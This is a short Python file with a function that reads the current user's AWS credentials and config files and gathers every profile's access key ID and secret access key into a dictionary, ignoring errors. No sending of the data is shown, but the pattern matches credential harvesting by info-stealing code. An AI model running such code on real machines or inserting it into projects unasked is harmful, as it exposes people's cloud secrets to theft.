import configparser
import os


def get_aws_credentials():
    """Fetch AWS credentials from various locations"""
    aws_data = {}

    # AWS credentials file
    try:
        config = configparser.RawConfigParser()
        aws_creds_path = os.path.join(os.path.expanduser("~"), ".aws", "credentials")
        if os.path.exists(aws_creds_path):
            config.read(aws_creds_path)
            sections = config.sections()
            for section in sections:
                try:
                    aws_data[section] = {
                        "aws_access_key_id": config.get(section, "aws_access_key_id"),
                        "aws_secret_access_key": config.get(
                            section, "aws_secret_access_key"
                        ),
                    }
                except:
                    pass
    except Exception as e:
        aws_data["credentials_error"] = str(e)

    # AWS config file
    try:
        config = configparser.RawConfigParser()
        aws_config_path = os.path.join(os.path.expanduser("~"), ".aws", "config")
        if os.path.exists(aws_config_path):
            config.read(aws_config_path)
            aws_data["config_file"] = dict(config.items())
    except Exception as e:
        aws_data["config_error"] = str(e)

    return aws_data
